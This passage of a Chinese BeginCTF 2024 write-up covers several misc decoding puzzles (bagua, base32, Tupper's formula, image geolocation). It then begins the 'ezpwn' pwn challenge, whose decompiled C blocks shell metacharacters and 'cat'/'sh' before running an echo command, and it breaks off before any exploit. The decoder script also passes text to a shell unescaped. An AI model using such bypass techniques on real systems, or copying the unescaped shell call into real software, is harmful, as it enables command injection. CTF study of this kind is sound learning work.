+<a id="__codelineno-5-2" name="__codelineno-5-2"></a><a href="#__codelineno-5-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="c1">#####八卦字符解密函数-开始####</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3"></a><a href="#__codelineno-5-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="k">def</span> <span class="nf">bArrToStr</span><span class="p">(</span><span class="n">bArr</span><span class="p">):</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4"></a><a href="#__codelineno-5-4"><span class="linenos" data-linenos=" 4 "></span></a>    <span class="n">nByte</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5"></a><a href="#__codelineno-5-5"><span class="linenos" data-linenos=" 5 "></span></a>    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bArr</span><span class="p">:</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6"></a><a href="#__codelineno-5-6"><span class="linenos" data-linenos=" 6 "></span></a>        <span class="n">nByte</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">base</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;raw_unicode_escape&#39;</span><span class="p">)</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7"></a><a href="#__codelineno-5-7"><span class="linenos" data-linenos=" 7 "></span></a>    <span class="k">return</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">nByte</span><span class="p">)</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8"></a><a href="#__codelineno-5-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="k">def</span> <span class="nf">to8bArr</span><span class="p">(</span><span class="n">baguaStr</span><span class="p">):</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9"></a><a href="#__codelineno-5-9"><span class="linenos" data-linenos=" 9 "></span></a>    <span class="n">code</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;☰&#39;</span><span class="p">:</span><span class="s1">&#39;0&#39;</span><span class="p">,</span>  <span class="c1"># 乾</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10"></a><a href="#__codelineno-5-10"><span class="linenos" data-linenos="10 "></span></a>            <span class="s1">&#39;☱&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span>  <span class="c1"># 兑</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11"></a><a href="#__codelineno-5-11"><span class="linenos" data-linenos="11 "></span></a>            <span class="s1">&#39;☲&#39;</span><span class="p">:</span><span class="s1">&#39;2&#39;</span><span class="p">,</span>  <span class="c1"># 离</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12"></a><a href="#__codelineno-5-12"><span class="linenos" data-linenos="12 "></span></a>            <span class="s1">&#39;☳&#39;</span><span class="p">:</span><span class="s1">&#39;3&#39;</span><span class="p">,</span>  <span class="c1"># 震</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13"></a><a href="#__codelineno-5-13"><span class="linenos" data-linenos="13 "></span></a>            <span class="s1">&#39;☴&#39;</span><span class="p">:</span><span class="s1">&#39;4&#39;</span><span class="p">,</span>  <span class="c1"># 巽</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14"></a><a href="#__codelineno-5-14"><span class="linenos" data-linenos="14 "></span></a>            <span class="s1">&#39;☵&#39;</span><span class="p">:</span><span class="s1">&#39;5&#39;</span><span class="p">,</span>  <span class="c1"># 坎</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15"></a><a href="#__codelineno-5-15"><span class="linenos" data-linenos="15 "></span></a>            <span class="s1">&#39;☶&#39;</span><span class="p">:</span><span class="s1">&#39;6&#39;</span><span class="p">,</span>  <span class="c1"># 艮</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16"></a><a href="#__codelineno-5-16"><span class="linenos" data-linenos="16 "></span></a>            <span class="s1">&#39;☷&#39;</span><span class="p">:</span><span class="s1">&#39;7&#39;</span><span class="p">,</span>  <span class="c1"># 坤</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17"></a><a href="#__codelineno-5-17"><span class="linenos" data-linenos="17 "></span></a>            <span class="p">}</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18"></a><a href="#__codelineno-5-18"><span class="linenos" data-linenos="18 "></span></a>    <span class="n">bArr</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19"></a><a href="#__codelineno-5-19"><span class="linenos" data-linenos="19 "></span></a>    <span class="n">temp</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20"></a><a href="#__codelineno-5-20"><span class="linenos" data-linenos="20 "></span></a>    <span class="c1"># 把八卦符转为8进制数字</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21"></a><a href="#__codelineno-5-21"><span class="linenos" data-linenos="21 "></span></a>    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">baguaStr</span><span class="p">:</span>
+<a id="__codelineno-5-22" name="__codelineno-5-22"></a><a href="#__codelineno-5-22"><span class="linenos" data-linenos="22 "></span></a>        <span class="n">temp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">s</span><span class="p">])</span>
+<a id="__codelineno-5-23" name="__codelineno-5-23"></a><a href="#__codelineno-5-23"><span class="linenos" data-linenos="23 "></span></a>    <span class="n">tempStr</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24"></a><a href="#__codelineno-5-24"><span class="linenos" data-linenos="24 "></span></a>    <span class="c1"># 数字3个一组 组合回八进制</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25"></a><a href="#__codelineno-5-25"><span class="linenos" data-linenos="25 "></span></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)):</span>
+<a id="__codelineno-5-26" name="__codelineno-5-26"></a><a href="#__codelineno-5-26"><span class="linenos" data-linenos="26 "></span></a>
+<a id="__codelineno-5-27" name="__codelineno-5-27"></a><a href="#__codelineno-5-27"><span class="linenos" data-linenos="27 "></span></a>        <span class="n">tempStr</span> <span class="o">+=</span> <span class="n">temp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+<a id="__codelineno-5-28" name="__codelineno-5-28"></a><a href="#__codelineno-5-28"><span class="linenos" data-linenos="28 "></span></a>
+<a id="__codelineno-5-29" name="__codelineno-5-29"></a><a href="#__codelineno-5-29"><span class="linenos" data-linenos="29 "></span></a>        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+<a id="__codelineno-5-30" name="__codelineno-5-30"></a><a href="#__codelineno-5-30"><span class="linenos" data-linenos="30 "></span></a>            <span class="n">bArr</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;0o&#39;</span><span class="o">+</span><span class="n">tempStr</span><span class="p">)</span>
+<a id="__codelineno-5-31" name="__codelineno-5-31"></a><a href="#__codelineno-5-31"><span class="linenos" data-linenos="31 "></span></a>            <span class="n">tempStr</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<a id="__codelineno-5-32" name="__codelineno-5-32"></a><a href="#__codelineno-5-32"><span class="linenos" data-linenos="32 "></span></a>    <span class="k">return</span> <span class="n">bArr</span>
+<a id="__codelineno-5-33" name="__codelineno-5-33"></a><a href="#__codelineno-5-33"><span class="linenos" data-linenos="33 "></span></a><span class="k">def</span> <span class="nf">base8bagua</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+<a id="__codelineno-5-34" name="__codelineno-5-34"></a><a href="#__codelineno-5-34"><span class="linenos" data-linenos="34 "></span></a>    <span class="n">arr</span> <span class="o">=</span> <span class="n">to8bArr</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+<a id="__codelineno-5-35" name="__codelineno-5-35"></a><a href="#__codelineno-5-35"><span class="linenos" data-linenos="35 "></span></a>    <span class="k">return</span>  <span class="n">bArrToStr</span><span class="p">(</span><span class="n">arr</span><span class="p">)</span>
+<a id="__codelineno-5-36" name="__codelineno-5-36"></a><a href="#__codelineno-5-36"><span class="linenos" data-linenos="36 "></span></a><span class="c1">#####八卦字符解密函数-结束####</span>
+<a id="__codelineno-5-37" name="__codelineno-5-37"></a><a href="#__codelineno-5-37"><span class="linenos" data-linenos="37 "></span></a>
+<a id="__codelineno-5-38" name="__codelineno-5-38"></a><a href="#__codelineno-5-38"><span class="linenos" data-linenos="38 "></span></a><span class="c1"># 所有出现的能识别的字符</span>
+<a id="__codelineno-5-39" name="__codelineno-5-39"></a><a href="#__codelineno-5-39"><span class="linenos" data-linenos="39 "></span></a><span class="n">zimu</span> <span class="o">=</span> <span class="s2">&quot;FYRCMLTUJWK4GOXNHZP62S73VDBQ&quot;</span>
+<a id="__codelineno-5-40" name="__codelineno-5-40"></a><a href="#__codelineno-5-40"><span class="linenos" data-linenos="40 "></span></a><span class="c1"># 依次替换@$&amp;为可能出现的字符</span>
+<a id="__codelineno-5-41" name="__codelineno-5-41"></a><a href="#__codelineno-5-41"><span class="linenos" data-linenos="41 "></span></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;a.txt&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<a id="__codelineno-5-42" name="__codelineno-5-42"></a><a href="#__codelineno-5-42"><span class="linenos" data-linenos="42 "></span></a>    <span class="n">txt</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<a id="__codelineno-5-43" name="__codelineno-5-43"></a><a href="#__codelineno-5-43"><span class="linenos" data-linenos="43 "></span></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">zimu</span><span class="p">:</span>
+<a id="__codelineno-5-44" name="__codelineno-5-44"></a><a href="#__codelineno-5-44"><span class="linenos" data-linenos="44 "></span></a>        <span class="n">itxt</span> <span class="o">=</span> <span class="n">txt</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
+<a id="__codelineno-5-45" name="__codelineno-5-45"></a><a href="#__codelineno-5-45"><span class="linenos" data-linenos="45 "></span></a>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">zimu</span><span class="p">:</span>
+<a id="__codelineno-5-46" name="__codelineno-5-46"></a><a href="#__codelineno-5-46"><span class="linenos" data-linenos="46 "></span></a>            <span class="n">jtxt</span> <span class="o">=</span> <span class="n">itxt</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&amp;&quot;</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
+<a id="__codelineno-5-47" name="__codelineno-5-47"></a><a href="#__codelineno-5-47"><span class="linenos" data-linenos="47 "></span></a>            <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">zimu</span><span class="p">:</span>
+<a id="__codelineno-5-48" name="__codelineno-5-48"></a><a href="#__codelineno-5-48"><span class="linenos" data-linenos="48 "></span></a>                <span class="n">ktxt</span> <span class="o">=</span> <span class="n">jtxt</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="p">,</span><span class="n">k</span><span class="p">)</span>
+<a id="__codelineno-5-49" name="__codelineno-5-49"></a><a href="#__codelineno-5-49"><span class="linenos" data-linenos="49 "></span></a>                <span class="c1"># 出错就下一个</span>
+<a id="__codelineno-5-50" name="__codelineno-5-50"></a><a href="#__codelineno-5-50"><span class="linenos" data-linenos="50 "></span></a>                <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-5-51" name="__codelineno-5-51"></a><a href="#__codelineno-5-51"><span class="linenos" data-linenos="51 "></span></a>                    <span class="c1"># 我写到base32 一直有问题，就直接调用shell了</span>
+<a id="__codelineno-5-52" name="__codelineno-5-52"></a><a href="#__codelineno-5-52"><span class="linenos" data-linenos="52 "></span></a>                    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;echo &#39;</span><span class="si">{</span><span class="n">ktxt</span><span class="si">}</span><span class="s2">&#39; | base32 -d&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<a id="__codelineno-5-53" name="__codelineno-5-53"></a><a href="#__codelineno-5-53"><span class="linenos" data-linenos="53 "></span></a>                    <span class="c1"># 输出结果</span>
+<a id="__codelineno-5-54" name="__codelineno-5-54"></a><a href="#__codelineno-5-54"><span class="linenos" data-linenos="54 "></span></a>                    <span class="n">osres</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span>
+<a id="__codelineno-5-55" name="__codelineno-5-55"></a><a href="#__codelineno-5-55"><span class="linenos" data-linenos="55 "></span></a>                    <span class="nb">print</span><span class="p">(</span><span class="n">base8bagua</span><span class="p">(</span><span class="n">osres</span><span class="p">))</span>
+<a id="__codelineno-5-56" name="__codelineno-5-56"></a><a href="#__codelineno-5-56"><span class="linenos" data-linenos="56 "></span></a>                <span class="k">except</span><span class="p">:</span>
+<a id="__codelineno-5-57" name="__codelineno-5-57"></a><a href="#__codelineno-5-57"><span class="linenos" data-linenos="57 "></span></a>                    <span class="k">continue</span>
+</code></pre></div>
+<p>脚本跑了好几分钟，应该还能优化，但是题解出来了，就不管了😄</p>
+<p>运行结果有4个，一眼看出是核心价值观编码，一个一个解密（就不写脚本核心价值观解密脚本了🐶）</p>
+<p>公正文明公正和谐公正平等文明友善法治和谐法治公正文明公正平等公正平等和谐爱国公正平等和谐和谐公正自由和谐爱国和谐富强和谐爱国公正公正公正和谐公正法治公正平等公正自由文明诚信和谐和谐文明公正平等公正公正和谐敬业和谐自由公正公正法治友善法治公正敬业法治友善平等公正民主和谐法治文明诚信和谐和谐民主和谐爱国文明诚信和谐和谐民主和谐文明公正友善爱国和谐爱国和谐民主公正和谐公正平等</p>
+<p>解出: bce-7bee8e3d808fcged-2ef94f}i{a7-18-12n81ce</p>
+<p>移位一下</p>
+<p>begin{eec8da87-ee32-11ed-8f8c-907841e2ffbc}</p>
+<hr />
+<p>脚本写了一两个小时😭</p>
+<h3 id="real-check-in">real check in</h3>
+<p>为了选手有更好的游玩体验请及时加入beginctf2024官方群,群号:612995005</p>
+<p>从catf1y的笔记本中发现了这个神秘的代码MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2===</p>
+<p>你能帮助我找到最后的flag吗?</p>
+<h5 id="_7">解题过程</h5>
+<p>签到题，cyber魔术棒一键解出   base32解码
+<img alt="real_check_in" src="../static/real_check_in.png" /></p>
+<h3 id="tupper">Tupper</h3>
+<p>年轻人们第一道misc签到题</p>
+<p>前一天没有任何思路，直到看到做出的人越来越多，应该是简单的题目，也没有看到啥提示，直到我搜索题目名，发现题目名就是提示😢</p>
+<h5 id="_8">解题过程</h5>
+<p>解压附件，获得很多txt，文件名为 数字.txt
+打开一个txt。应该是是base，</p>
+<p>按文件名排序打开所有文件</p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><a href="#__codelineno-6-1"><span class="linenos" data-linenos="1 "></span></a>cat $(ls -v *.txt) 
+<a id="__codelineno-6-2" name="__codelineno-6-2"></a><a href="#__codelineno-6-2"><span class="linenos" data-linenos="2 "></span></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3"></a><a href="#__codelineno-6-3"><span class="linenos" data-linenos="3 "></span></a>MTQyNzgxOTM0MzI3MjgwMjYwNDkyOTg1NzQ1NzU1NTc1MzQzMjEwNjIzNDkzNTI1NDM1NjI2NTY3NjY0Njk3MDQwOTI4NzQ2ODgzNTQ2NzkzNzEyMTI0NDQzODIyOTg4MjEzNDIwOTM0NTAzOTg5MDcwOTY5NzYwMDI0NTg4MDc1OTg1MzU3MzUxNzIxMjY2NTc1MDQxMzExNzE2ODQ5MDcxNzMwODY2NTk1MDUxNDM5MjAzMDAwODU4MDg4MDk2NDcyNTY3OTAzODQzNzg1NTM3ODAyODI4OTQyMzk3NTE4OTg2MjAwNDExNDMzODMzMTcwNjQ3MjcxMzY5MDM2MzQ3NzA5MzYzOTg1MTg1NDc5MDA1MTI1NDg0MTk0ODYzNjQ5MTUzOTkyNTM5NDEyNDU5MTEyMDUyNjI0OTM1OTExNTg0OTc3MDgyMTkxMjY0NTM1ODc0NTY2MzczMDI4ODg3MDEzMDMzODIyMTA3NDg2Mjk4MDAwODE4MjE2ODQyODMxODczNjg1NDM2MDE1NTk3Nzg0MzE3MzUwMDY3OTQ3NjE1NDI0MTMwMDY2MjEyMTkyMDczMjI4MDg0NDkyMzIwNTA1Nzg4NTI0MzEzNjE2Nzg3NDUzNTU3NzY5MjExMzIzNTI0MTk5MzE5MDc4MzgyMDUwMDExODQ=
+</code></pre></div>
+<p>解码base64，获得一串数字</p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a><a href="#__codelineno-7-1"><span class="linenos" data-linenos="1 "></span></a>cat $(ls -v *.txt) | base64 -d
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a><a href="#__codelineno-7-2"><span class="linenos" data-linenos="2 "></span></a>
+<a id="__codelineno-7-3" name="__codelineno-7-3"></a><a href="#__codelineno-7-3"><span class="linenos" data-linenos="3 "></span></a>14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184
+</code></pre></div>
+<p>起初以为是转字符串，转好久，失败。</p>
+<p>按提示搜索tupper</p>
+<p>使用 <a href="https://tuppers-formula.ovh/">在线解密网站https://tuppers-formula.ovh/</a></p>
+<p>获得flag</p>
+<p><img alt="flag" src="../static/Tupper.png" /></p>
+<h3 id="where-is-crazyman-v10">where is crazyman v1.0</h3>
+<p>你能找到空白在哪里吗? 只需要提供地段名称即可.
+可接受的格式有两种begin{{三位简体中文}}或者begin{{9位英文字母第一个需要大写}}
+例如:begin{二七广场} 或者 begin{Erqisquare}</p>
+<h5 id="_9">题目附件</h5>
+<p><img alt="题目" src="../static/where_is_crazyman_v1.0.png" /></p>
+<h5 id="_10">解题过程</h5>
+<p>google搜图
+ 获得地名  秋叶原</p>
+<p>flag为：
+ begin{秋叶原}</p>
+<h2 id="pwn">PWN</h2>
+<h3 id="ezpwn">ezpwn</h3>
+<h5 id="_11">题目</h5>
+<p><a href="../static/ezpwn">题目下载</a></p>
+<h5 id="_12">解题过程</h5>
+<p>checksec看了一下，看不懂，(大佬们做pwn都是看的✅)
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a><a href="#__codelineno-8-1"><span class="linenos" data-linenos="1 "></span></a>    Arch:     amd64-64-little
+<a id="__codelineno-8-2" name="__codelineno-8-2"></a><a href="#__codelineno-8-2"><span class="linenos" data-linenos="2 "></span></a>    RELRO:    Full RELRO
+<a id="__codelineno-8-3" name="__codelineno-8-3"></a><a href="#__codelineno-8-3"><span class="linenos" data-linenos="3 "></span></a>    Stack:    Canary found
+<a id="__codelineno-8-4" name="__codelineno-8-4"></a><a href="#__codelineno-8-4"><span class="linenos" data-linenos="4 "></span></a>    NX:       NX enabled
+<a id="__codelineno-8-5" name="__codelineno-8-5"></a><a href="#__codelineno-8-5"><span class="linenos" data-linenos="5 "></span></a>    PIE:      PIE enabled
+</code></pre></div>
+直接ida64打开</p>
+<p>大概逻辑是有个菜单
+4个选项
+<div class="language-c highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a><a href="#__codelineno-9-1"><span class="linenos" data-linenos="1 "></span></a><span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;1.Test your data&quot;</span><span class="p">);</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2"></a><a href="#__codelineno-9-2"><span class="linenos" data-linenos="2 "></span></a><span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;2.Test your command&quot;</span><span class="p">);</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3"></a><a href="#__codelineno-9-3"><span class="linenos" data-linenos="3 "></span></a><span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;3.Test your file&quot;</span><span class="p">);</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4"></a><a href="#__codelineno-9-4"><span class="linenos" data-linenos="4 "></span></a><span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;4.Exit.&quot;</span><span class="p">);</span>
+</code></pre></div></p>
+<p>选择后的逻辑为
+<div class="language-c highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><a href="#__codelineno-10-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="w">      </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v3</span><span class="w"> </span><span class="p">)</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2"></a><a href="#__codelineno-10-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="w">      </span><span class="p">{</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3"></a><a href="#__codelineno-10-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4"></a><a href="#__codelineno-10-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="w">          </span><span class="n">filemanage</span><span class="p">();</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5"></a><a href="#__codelineno-10-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="w">          </span><span class="k">break</span><span class="p">;</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6"></a><a href="#__codelineno-10-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7"></a><a href="#__codelineno-10-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">          </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Please input index.&quot;</span><span class="p">);</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8"></a><a href="#__codelineno-10-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">          </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9"></a><a href="#__codelineno-10-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">          </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;please input value&quot;</span><span class="p">);</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10"></a><a href="#__codelineno-10-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">          </span><span class="n">v1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getchar</span><span class="p">();</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11"></a><a href="#__codelineno-10-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">          </span><span class="n">getchar</span><span class="p">();</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12"></a><a href="#__codelineno-10-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">          </span><span class="n">s</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v1</span><span class="p">;</span>
+<a id="__codelineno-10-13" name="__codelineno-10-13"></a><a href="#__codelineno-10-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">          </span><span class="k">break</span><span class="p">;</span>
+<a id="__codelineno-10-14" name="__codelineno-10-14"></a><a href="#__codelineno-10-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span>
+<a id="__codelineno-10-15" name="__codelineno-10-15"></a><a href="#__codelineno-10-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">          </span><span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+<a id="__codelineno-10-16" name="__codelineno-10-16"></a><a href="#__codelineno-10-16"><span class="linenos" data-linenos="16 "></span></a><span class="w">          </span><span class="n">memset</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x100uLL</span><span class="p">);</span>
+<a id="__codelineno-10-17" name="__codelineno-10-17"></a><a href="#__codelineno-10-17"><span class="linenos" data-linenos="17 "></span></a><span class="w">          </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Please input your echo command&quot;</span><span class="p">);</span>
+<a id="__codelineno-10-18" name="__codelineno-10-18"></a><a href="#__codelineno-10-18"><span class="linenos" data-linenos="18 "></span></a><span class="w">          </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE0uLL</span><span class="p">);</span>
+<a id="__codelineno-10-19" name="__codelineno-10-19"></a><a href="#__codelineno-10-19"><span class="linenos" data-linenos="19 "></span></a><span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;;&#39;</span><span class="p">)</span>
+<a id="__codelineno-10-20" name="__codelineno-10-20"></a><a href="#__codelineno-10-20"><span class="linenos" data-linenos="20 "></span></a><span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;`&#39;</span><span class="p">)</span>
+<a id="__codelineno-10-21" name="__codelineno-10-21"></a><a href="#__codelineno-10-21"><span class="linenos" data-linenos="21 "></span></a><span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;|&#39;</span><span class="p">)</span>
+<a id="__codelineno-10-22" name="__codelineno-10-22"></a><a href="#__codelineno-10-22"><span class="linenos" data-linenos="22 "></span></a><span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">)</span>
+<a id="__codelineno-10-23" name="__codelineno-10-23"></a><a href="#__codelineno-10-23"><span class="linenos" data-linenos="23 "></span></a><span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;&amp;&#39;</span><span class="p">)</span>
+<a id="__codelineno-10-24" name="__codelineno-10-24"></a><a href="#__codelineno-10-24"><span class="linenos" data-linenos="24 "></span></a><span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;cat&quot;</span><span class="p">)</span>
+<a id="__codelineno-10-25" name="__codelineno-10-25"></a><a href="#__codelineno-10-25"><span class="linenos" data-linenos="25 "></span></a><span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;sh&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
+<a id="__codelineno-10-26" name="__codelineno-10-26"></a><a href="#__codelineno-10-26"><span class="linenos" data-linenos="26 "></span></a><span class="w">          </span><span class="p">{</span>
+<a id="__codelineno-10-27" name="__codelineno-10-27"></a><a href="#__codelineno-10-27"><span class="linenos" data-linenos="27 "></span></a><span class="w">            </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;Forbidden.&quot;</span><span class="p">);</span>
+<a id="__codelineno-10-28" name="__codelineno-10-28"></a><a href="#__codelineno-10-28"><span class="linenos" data-linenos="28 "></span></a><span class="w">            </span><span class="n">_exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
+<a id="__codelineno-10-29" name="__codelineno-10-29"></a><a href="#__codelineno-10-29"><span class="linenos" data-linenos="29 "></span></a><span class="w">          </span><span class="p">}</span>
